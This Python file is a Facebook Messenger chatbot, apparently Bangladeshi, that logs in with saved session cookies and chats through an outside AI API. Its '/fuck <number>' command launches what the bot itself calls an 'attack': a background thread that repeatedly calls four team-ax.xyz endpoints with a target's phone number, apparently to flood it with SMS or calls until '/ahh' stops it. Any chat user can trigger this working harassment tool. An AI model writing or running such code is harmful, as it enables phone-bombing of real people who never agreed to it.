import os
import requests
import time
from fbchat import Client, Message, TypingStatus, ThreadType
from fbchat.models import *
import threading

# Read cookies from cookie.txt
def load_cookies_from_file(file_path):
    cookies = {}
    with open(file_path, 'r') as file:
        cookie_str = file.read().strip()
        for item in cookie_str.split(';'):
            item = item.strip()
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key] = value
    return cookies

# Function to fetch response from API
def fetch_api_response(text):
    api_url = f"https://ax-tools.team-ax.xyz/AI/?text={text}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            if "success" in data:
                return data["success"]
    except requests.RequestException as e:
        print(f"Error fetching API response: {e}")
    return None

# Function to validate phone number
def validate_phone_number(number):
    return number.startswith("01") and len(number) == 11

# Function to log user actions
def log_action(user_id, action, number):
    with open("logs.txt", "a") as log_file:
        log_file.write(f"User ID: {user_id}, Action: {action}, Number: {number}\n")

# Function to send requests in a loop
def send_requests(number, stop_event):
    apis = [
        f"https://api.team-ax.xyz/api30sec?phone={number}",
        f"https://api.team-ax.xyz/api30sec2?phone={number}",
        f"https://api.team-ax.xyz/api1mnt?phone={number}",
        f"https://api.team-ax.xyz/api1mnt2?phone={number}"
    ]
    while not stop_event.is_set():
        # Send requests to all APIs
        for api in apis:
            if stop_event.is_set():
                break
            try:
                requests.get(api)
                print(f"Sent request to {api}")
            except requests.RequestException as e:
                print(f"Error sending request to {api}: {e}")

        # Sleep for 30 seconds for the first two APIs
        time.sleep(30)
        
        # Send requests to the first two APIs after 30 seconds
        for api in apis[:2]:
            if stop_event.is_set():
                break
            try:
                requests.get(api)
                print(f"Sent request to {api}")
            except requests.RequestException as e:
                print(f"Error sending request to {api}: {e}")

        # Sleep for an additional 30 seconds (total 60 seconds from the start) for the last two APIs
        time.sleep(30)

        # Send requests to the last two APIs after 60 seconds
        for api in apis[2:]:
            if stop_event.is_set():
                break
            try:
                requests.get(api)
                print(f"Sent request to {api}")
            except requests.RequestException as e:
                print(f"Error sending request to {api}: {e}")

# CLASS FOR THE BOT
class MessBot(Client):

    admin_id = '100075083821407'
    paused_groups = set()  # Store paused thread_ids
    active_requests = {}  # Store active request threads

    # Read Messages, See Messages from other users
    def onMessage(self, mid=None, author_id=None, message_object=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
        try:
            msg = str(message_object).split(",")[15][14:-1]
            print(msg)
            if "//video.xx.fbcdn" in msg:
                msg = msg
            else:
                msg = str(message_object).split(",")[19][20:-1]
        except:
            try:
                msg = (message_object.text).lower()
                print(msg)
            except:
                pass

        def sendMsg(reply):
            if author_id != self.uid:
                reply_msg = Message(text=reply, reply_to_id=mid)  # Use reply_to_id to reply to the message
                self.send(reply_msg, thread_id=thread_id, thread_type=thread_type)

        if author_id == self.admin_id:
            if "simi ekhon chup koro" in msg:
                self.paused_groups.add(thread_id)
                sendMsg("Accha ami ar kichu bolbo na 🥺")
                return
            elif "simi ekhon bolo" in msg:
                if thread_id in self.paused_groups:
                    self.paused_groups.remove(thread_id)
                    sendMsg("Etokkhon por amake mone porlo😅")
                    return

        if thread_id in self.paused_groups:
            return

        if author_id != self.uid:
            self.markAsDelivered(thread_id, mid)  # Mark the message as delivered
            self.markAsRead(thread_id)  # Mark the message as seen

            if any(word in msg for word in ["hi", "hello", "hiii", "hey"]):
                reply = "Hmm bolo! Ami Simi"
                sendMsg(reply)
            elif msg.startswith("/fuck "):
                number = msg.split(" ")[1]
                if validate_phone_number(number):
                    if author_id in self.active_requests and len(self.active_requests[author_id]) > 0 and author_id != self.admin_id:
                        sendMsg("Tumi already ekta attack run kore rakhso, Ager ta off koro tarpor new attack run koro😒")
                    else:
                        if author_id not in self.active_requests:
                            self.active_requests[author_id] = {}
                        stop_event = threading.Event()
                        self.active_requests[author_id][number] = stop_event
                        threading.Thread(target=send_requests, args=(number, stop_event)).start()
                        log_action(author_id, "fuck", number)
                        sendMsg(f"Ei {number} Number e Attack start hoye geche✅ ore maf korte chaile /ahh {number} eita use koiro kintu.")
                else:
                    sendMsg("Phone number ta to valo kore lekh vai ei ne dekh kemne lekha lagbe /fuck 0166666666 with 11 digits.")
            elif msg.startswith("/ahh "):
                number = msg.split(" ")[1]
                if author_id in self.active_requests and number in self.active_requests[author_id]:
                    self.active_requests[author_id][number].set()
                    del self.active_requests[author_id][number]
                    log_action(author_id, "ahh", number)
                    sendMsg(f"Ei {number} Number e Attack off hoye geche❌")
                    if len(self.active_requests[author_id]) == 0:
                        del self.active_requests[author_id]
                else:
                    sendMsg("Ei Number er upor tmr kono active attack running nei😑")
            else:
                api_response = fetch_api_response(msg)  # Fetch response from API first

                self.setTypingStatus(TypingStatus.TYPING, thread_id=thread_id, thread_type=thread_type)
                time.sleep(2)  # Simulate typing delay
                self.setTypingStatus(TypingStatus.STOPPED, thread_id=thread_id, thread_type=thread_type)

                if api_response:
                    if api_response == "আমি উত্তর কিভাবে জানি না। আমাকে উত্তর দাও।":
                        sendMsg("Vai valo kore lekho, ami abr complicated text kom bujhi🙃")
                    else:
                        sendMsg(api_response)
                else:
                    sendMsg("I'm sorry, I didn't understand that.")

# Get cookies from the cookie.txt file
session_cookies = load_cookies_from_file('cookie.txt')

# Initialize the bot
bot = MessBot(' ', ' ', session_cookies=session_cookies)
print(bot.isLoggedIn())

try:
    bot.listen()
except Exception as e:
    print(f"An error occurred: {e}")
    bot.listen()
